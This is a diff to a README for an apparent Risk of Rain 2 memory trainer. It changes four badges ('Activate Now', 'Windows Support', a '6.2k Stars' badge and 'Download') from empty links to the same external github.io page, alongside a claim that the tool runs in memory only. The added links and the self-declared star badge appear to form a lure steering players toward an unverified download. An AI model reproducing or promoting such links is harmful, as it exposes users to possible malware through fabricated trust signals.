@@ -11,10 +11,10 @@ Risk of Rain 2 thrives on chaos—random loot, scaling enemies, and unpredictabl
 \[!IMPORTANT]
 This trainer operates in memory only, leaving your game files untouched. Always back up your saves before activating.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.2k Stars](https://img.shields.io/badge/⭐️%206.2k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://risk-of-rain-2-trainers.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://risk-of-rain-2-trainers.github.io/.github/)
+[![⭐️ 6.2k Stars](https://img.shields.io/badge/⭐️%206.2k-Stars-yellow?style=for-the-badge\&logo=github)](https://risk-of-rain-2-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://risk-of-rain-2-trainers.github.io/.github/)
 
 ---
 
